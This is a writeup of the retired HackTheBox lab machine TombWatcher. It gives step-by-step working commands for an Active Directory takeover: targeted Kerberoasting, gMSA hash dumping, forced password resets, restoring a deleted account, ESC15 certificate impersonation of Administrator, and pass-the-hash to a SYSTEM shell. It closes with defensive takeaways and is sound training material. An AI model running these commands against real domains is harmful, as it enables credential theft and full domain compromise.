---
title: "TombWatcher — HackTheBox Writeup"
date: 2026-04-29
author: "Basil9099"
tags: ["HTB","Windows","Active Directory","BloodHound","Kerberos","Kerberoasting","gMSA","AD CS","ESC15","CVE-2024-49019","Tombstone","Privilege Escalation"]
categories: ["CTF Writeups"]
summary: "Henry → targeted Kerberoast on Alfred → AddSelf to INFRASTRUCTURE → ReadGMSAPassword on ansible_dev$ → Sam → John → reanimate tombstoned cert_admin via GenericAll on OU=ADCS → ESC15 (CVE-2024-49019) on the WebServer template → Administrator."
images: ["/images/tombwatcher/tombwatcher.webp"]
cover:
  image: "/images/tombwatcher/tombwatcher.webp"
  alt: "TombWatcher HTB image"
  caption: "TombWatcher - CTF - Hack The Box"
  relative: true
  hidden: false

---

> ⚠️ **Spoiler warning**: This covers a retired HTB machine. This writeup documents my playthrough of the retired Hack The Box machine **TombWatcher**.

The VPN IPs shown below are the HTB-assigned VPN addresses used during the box (left intact here for reproducibility). Do not attempt this on non-authorised or active systems.

# TombWatcher (HTB) — Walkthrough

## Overview
- **Platform:** Hack The Box (retired)
- **Target OS:** Windows Server 2022 — Active Directory Domain Controller (with AD CS)
- **Focus:** WriteSPN-driven targeted Kerberoasting → group AddSelf → gMSA password read → ACL chain through Sam and John → tombstone reanimation of a deleted CA operator → ESC15 (CVE-2024-49019) on the default `WebServer` template → Domain Admin.
- **Difficulty:** Medium

---

## Recon

Initial scan:

```bash
nmap -sV -sC -oN scans/tombwatcher-initial 10.129.x.x
```

**Result highlights (relevant lines)**

```text
53/tcp    open  domain         Simple DNS Plus
88/tcp    open  kerberos-sec   Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap           Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ldapssl
3268/tcp  open  ldap           Global Catalog
3269/tcp  open  ldapssl        Global Catalog
5985/tcp  open  http           Microsoft HTTPAPI (WinRM)
```

The full Kerberos + LDAP + Global-Catalog set confirms a **Domain Controller**, and the TLS certificate on 636/3269 disclosed the domain (`tombwatcher.htb`) and the DC hostname. Add the host to `/etc/hosts` so Kerberos and LDAPS work cleanly.

```bash
echo '10.129.x.x  dc01.tombwatcher.htb tombwatcher.htb' | sudo tee -a /etc/hosts
```

![Nmap output showing AD service set on the DC](/images/tombwatcher/nmap.png)

---

## Initial credentials & enumeration as henry

The box description provides a starting credential:

```text
henry : <henry-password>
```

Validate against SMB:

```bash
nxc smb 10.129.x.x -u henry -p '<henry-password>'
```

`[+] tombwatcher.htb\henry:<henry-password>` confirms the account is a valid domain user.

![nxc smb confirming Henry's credentials](/images/tombwatcher/nxc_smb_henry.png)

Pull a user list and a quick Kerberoast/AS-REP sanity check:

```bash
nxc ldap 10.129.x.x -u henry -p '<henry-password>' --users
nxc ldap 10.129.x.x -u henry -p '<henry-password>' --kerberoasting roast.txt
nxc ldap 10.129.x.x -u henry -p '<henry-password>' --asreproastable
```

Notable accounts surface immediately: `henry`, `alfred`, `sam`, `john`, `ansible_dev$` (gMSA), `Administrator`, plus the usual built-ins. No accounts have an SPN or `DONT_REQUIRE_PREAUTH` set yet — the SPN piece is what we'll add ourselves in a moment.

![nxc ldap dumping domain users](/images/tombwatcher/nxc_ldap_users.png)

---

## BloodHound: henry → Alfred (WriteSPN)

Collect with `bloodhound-python` directly against the DC:

```bash
bloodhound-python -d tombwatcher.htb -u henry -p '<henry-password>' \
  -ns 10.129.x.x -c All --zip
```

Import the zip into BloodHound CE and mark `henry` as **Owned**. The interesting outbound edge is:

```text
HENRY --[WriteSPN]--> ALFRED
```

`WriteSPN` lets `henry` write the `servicePrincipalName` attribute on the `alfred` user object. Alfred is **not** kerberoastable today — but if we plant an SPN on the account we can request a TGS for it, get back a hash encrypted with Alfred's password-derived key, and crack it offline. This is the **targeted Kerberoasting** primitive.

![BloodHound WriteSPN edge from Henry to Alfred](/images/tombwatcher/bloodhound_henry_alfred.png)

---

## Targeted Kerberoast: Alfred

The cleanest tool for this from Linux is `targetedKerberoast.py` — it walks every principal you have `WriteSPN` on, sets a temporary SPN, requests the TGS, then reverts the SPN.

```bash
targetedKerberoast.py -d tombwatcher.htb -u henry -p '<henry-password>' \
  --dc-ip 10.129.x.x --request-user alfred
```

The script prints a hashcat-format `$krb5tgs$23$*alfred$...` line and confirms the SPN was cleaned up.

![targetedKerberoast extracting Alfred's TGS](/images/tombwatcher/targeted_kerberoast.png)

Crack with hashcat against rockyou:

```bash
hashcat -m 13100 -a 0 alfred.tgs /usr/share/wordlists/rockyou.txt --force
```

![hashcat cracking Alfred's TGS](/images/tombwatcher/hashcat_alfred.png)

Validate the recovered password:

```bash
nxc smb 10.129.x.x -u alfred -p '<alfred-password>'
```

If you'd rather drive this from a Windows beachhead, the equivalent is two PowerView/Rubeus calls:

```powershell
Set-DomainObject -Identity alfred -Set @{serviceprincipalname='fake/tombwatcher'}
Rubeus.exe kerberoast /user:alfred /nowrap
Set-DomainObject -Identity alfred -Clear serviceprincipalname
```

---

## INFRASTRUCTURE group: AddSelf abuse

Re-running BloodHound with `alfred` marked Owned shows the next edge:

```text
ALFRED --[AddSelf]--> INFRASTRUCTURE  (group)
```

`AddSelf` is the narrowest possible group-write right — Alfred can add **only himself** to the group, nothing else. That's enough, because the group itself holds the privilege we actually want.

```bash
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb \
  -u alfred -p '<alfred-password>' add groupMember INFRASTRUCTURE alfred
```

![bloodyAD adding Alfred to INFRASTRUCTURE](/images/tombwatcher/bloodyad_addself.png)

Confirm membership and **destroy the cached Kerberos ticket** so the new group SID lands in the next TGT:

```bash
nxc ldap 10.129.x.x -u alfred -p '<alfred-password>' \
  --query "(&(objectClass=user)(sAMAccountName=alfred))" "memberOf"
kdestroy
```

Equivalent on a Windows host:

```powershell
Add-DomainGroupMember -Identity 'INFRASTRUCTURE' -Members 'alfred'
klist purge
```

---

## ReadGMSAPassword: ansible_dev$

The reason we wanted into `INFRASTRUCTURE` is the next BloodHound edge:

```text
INFRASTRUCTURE --[ReadGMSAPassword]--> ansible_dev$
```

`ansible_dev$` is a Group Managed Service Account — its password is a 240-byte blob auto-rotated by AD and stored in the `msDS-ManagedPassword` attribute, readable only by principals listed in `msDS-GroupMSAMembership`. INFRASTRUCTURE is now in that list, so we are too.

```bash
nxc ldap 10.129.x.x -u alfred -p '<alfred-password>' --gmsa
```

(Or if you prefer the dedicated tool: `gMSADumper.py -u alfred -p '<alfred-password>' -d tombwatcher.htb`.)

The output gives the NT hash for `ansible_dev$`. Validate it:

```bash
nxc smb 10.129.x.x -u 'ansible_dev$' -H <ansible_dev-NTLM>
```

![gMSA dump returning ansible_dev$ NT hash](/images/tombwatcher/gmsa_dump.png)

---

## ansible_dev$ → Sam

Re-collect BloodHound as `ansible_dev$` and an outbound write edge appears onto **Sam** — typically one of the standard ACL family (`GenericAll` / `WriteOwner` / `ForceChangePassword`). Whichever edge BloodHound surfaces in your run, the abuse pattern is the same: take ownership if needed, grant yourself password-reset rights, then reset Sam's password.

The simplest end-to-end sequence from Linux uses `bloodyAD`, which handles all three primitives uniformly:

```bash
# If the edge is WriteOwner, take ownership first
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb \
  -u 'ansible_dev$' -p :<ansible_dev-NTLM> set owner sam 'ansible_dev$'

# Grant DACL write so we can issue the reset
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb \
  -u 'ansible_dev$' -p :<ansible_dev-NTLM> add genericAll sam 'ansible_dev$'

# Reset Sam's password
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb \
  -u 'ansible_dev$' -p :<ansible_dev-NTLM> set password sam 'NewP@ssw0rd!1'
```

If your edge is `ForceChangePassword` directly, that's a one-liner over SAMR:

```bash
net rpc password 'sam' 'NewP@ssw0rd!1' \
  -U 'tombwatcher.htb/ansible_dev$%<ansible_dev-NTLM>' -S 10.129.x.x
```

(Or from a Windows beachhead: `Set-DomainUserPassword -Identity sam -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!1' -AsPlainText -Force)`.)

Validate:

```bash
nxc smb 10.129.x.x -u sam -p 'NewP@ssw0rd!1'
```

![Resetting Sam's password and validating](/images/tombwatcher/sam_reset.png)

---

## Sam → John

Re-collect again with `sam` marked Owned and BloodHound shows the same shape of edge onto **John** — another member of the `GenericAll` / `WriteOwner` / `ForceChangePassword` family. Apply the same pattern: substitute whichever edge is actually present, then reset.

```bash
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb \
  -u sam -p 'NewP@ssw0rd!1' set password john 'NewP@ssw0rd!2'
```

```bash
nxc smb 10.129.x.x -u john -p 'NewP@ssw0rd!2'
```

![Sam resetting John's password](/images/tombwatcher/john_reset.png)

---

## Reanimating the tombstoned cert_admin

John's outbound rights look unremarkable at first — until you check the **OU** edges. BloodHound shows:

```text
JOHN --[GenericAll]--> OU=ADCS,DC=tombwatcher,DC=htb
```

`GenericAll` on a container/OU includes the `Reanimate-Tombstone` extended right on its children. That matters because if you list deleted objects in the directory you'll find one suspicious entry:

```powershell
# From a Windows host with John's creds
Get-ADObject -IncludeDeletedObjects -Filter { Name -like 'cert_admin*' } `
  -Properties lastKnownParent,isDeleted,distinguishedName
```

```text
Name              : cert_admin
                    DEL:<guid>
isDeleted         : True
lastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
distinguishedName : CN=cert_admin\0ADEL:<guid>,CN=Deleted Objects,DC=tombwatcher,DC=htb
```

The `lastKnownParent` is the OU John controls — that's exactly the scope where his `GenericAll` lets him reanimate the object. Restore it:

```powershell
Restore-ADObject -Identity '<DEL-guid>'
```

From Linux the same primitive is an LDAP modify with the `LDAP_SERVER_SHOW_DELETED_OID` control (`1.2.840.113556.1.4.417`) plus removing `isDeleted` and rewriting `distinguishedName` back into `OU=ADCS`. `bloodyAD` exposes this directly:

```bash
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb \
  -u john -p 'NewP@ssw0rd!2' restore 'CN=cert_admin\0ADEL:<guid>,CN=Deleted Objects,DC=tombwatcher,DC=htb'
```

![Restore-ADObject reanimating cert_admin](/images/tombwatcher/restore_certadmin.png)

A reanimated object comes back **without a usable password** — but John's `GenericAll` on the parent OU is inherited onto the restored child, so we can set one:

```bash
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb \
  -u john -p 'NewP@ssw0rd!2' set password cert_admin 'NewP@ssw0rd!3'
```

```bash
nxc smb 10.129.x.x -u cert_admin -p 'NewP@ssw0rd!3'
```

![cert_admin reanimated and password set](/images/tombwatcher/certadmin_validated.png)

---

## AD CS recon: WebServer template (ESC15)

`cert_admin` exists for a reason — it has enrolment rights inside the CA. Enumerate templates with Certipy:

```bash
certipy-ad find -u cert_admin -p 'NewP@ssw0rd!3' -dc-ip 10.129.x.x \
  -vulnerable -enabled -stdout
```

The hit is the default **`WebServer`** template, flagged as ESC15:

```text
Template Name                  : WebServer
Schema Version                 : 1
Enrollment Rights              : tombwatcher.htb\cert_admin
Application Policies           : Server Authentication
[!] Vulnerabilities             : ESC15 - Schema v1, Application Policy injection (CVE-2024-49019)
```

![certipy-ad find flagging WebServer / ESC15](/images/tombwatcher/certipy_find.png)

**Why this is exploitable.** Schema **v1** templates predate the `mspki-certificate-application-policy` attribute, so the CA does not enforce server-side filtering of Application Policy OIDs supplied at request time. A schema-v1 template like `WebServer` that any low-priv user can enrol on therefore lets the requester inject **Client Authentication** as an application policy, even though the template itself only lists Server Authentication. Combined with the SAN/UPN smuggling allowed in the same request, this is enough to get a client-auth certificate for any principal — including `Administrator` — and PKINIT to the KDC as them. SpecterOps/Microsoft track this as **CVE-2024-49019** ("EKUwu") and Certipy as **ESC15**.

---

## ESC15 exploitation

Request the certificate, smuggling in `Client Authentication` as an application policy and `administrator@tombwatcher.htb` as the UPN:

```bash
certipy-ad req \
  -u cert_admin@tombwatcher.htb -p 'NewP@ssw0rd!3' \
  -dc-ip 10.129.x.x -ca tombwatcher-DC01-CA \
  -template WebServer \
  -upn administrator@tombwatcher.htb \
  -application-policies 'Client Authentication'
```

Certipy returns `administrator.pfx`. Authenticate with it via PKINIT to pull Administrator's NT hash and a TGT:

```bash
certipy-ad auth -pfx administrator.pfx -domain tombwatcher.htb -dc-ip 10.129.x.x
```

```text
[*] Using principal: administrator@tombwatcher.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:<NTLM>
```

![Certipy req + auth returning Administrator NT hash](/images/tombwatcher/certipy_esc15.png)

---

## SYSTEM shell & root flag

Pass-the-hash into a SYSTEM shell with `psexec.py`:

```bash
impacket-psexec tombwatcher.htb/Administrator@10.129.x.x -hashes :<NTLM>
```

```interactive shell
C:\Windows\system32> whoami
nt authority\system
```

![psexec.py landing as nt authority\system](/images/tombwatcher/psexec_system.png)

**Root flag:**

```interactive shell
C:\Users\Administrator\Desktop> type root.txt
```

"<root-flag-here>"

![Root flag](/images/tombwatcher/root_flag.png)

---

## User flag

The user flag sits on Henry's desktop and is reachable over WinRM with the original creds:

```bash
evil-winrm -i 10.129.x.x -u henry -p '<henry-password>'
```

```interactive shell
*Evil-WinRM* PS C:\Users\henry\Desktop> type user.txt
```

"<user-flag-here>"

![User flag](/images/tombwatcher/user_flag.png)

---

## Takeaways

- **`WriteSPN` is a sleeper Kerberoast primitive.** Tools like BloodHound surface it, but it's easy to dismiss because the target account isn't roastable *yet*. Audit `WriteSPN` the same way you audit `GenericWrite`.
- **`AddSelf` turns one ACL into a group's worth of rights.** It's the most innocuous-looking group write right and the easiest to overlook in a Tier-0 review — TombWatcher exists because INFRASTRUCTURE held a powerful right that AddSelf inherited.
- **`ReadGMSAPassword` is Tier-0.** A gMSA whose password any pivot user can read is functionally a shared local-admin account. Treat the `msDS-GroupMSAMembership` ACL as carefully as Domain Admins membership.
- **Tombstone reanimation is a stealthy primitive.** Default Windows auditing rarely flags `Restore-ADObject`, and the restored object inherits the OU's ACLs cleanly — it's a great persistence/recovery pattern that almost no defender monitors. Audit `GenericAll` on OUs that contain privileged accounts.
- **ESC15 / CVE-2024-49019 lives on default templates.** `WebServer` is shipped with every CA and is schema v1 — exactly the conditions for application-policy injection. Migrate v1 templates to v2/v3 or remove low-priv enrolment rights.

---

## Resources

- [Certipy](https://github.com/ly4k/Certipy) — `find`, `req`, `auth`, ESC15 support
- [BloodHound CE — SpecterOps](https://bloodhound.specterops.io/)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) — ACL abuse, tombstone restore, gMSA
- [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) — WriteSPN abuse
- [SpecterOps — ESC15 / EKUwu (CVE-2024-49019)](https://posts.specterops.io/ekuwu-not-just-another-ad-cs-esc-3438213e9079)
- [Microsoft — Restoring deleted Active Directory objects](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd379542(v=ws.10))
- [MITRE ATT&CK T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- Hack The Box — retired machines archive
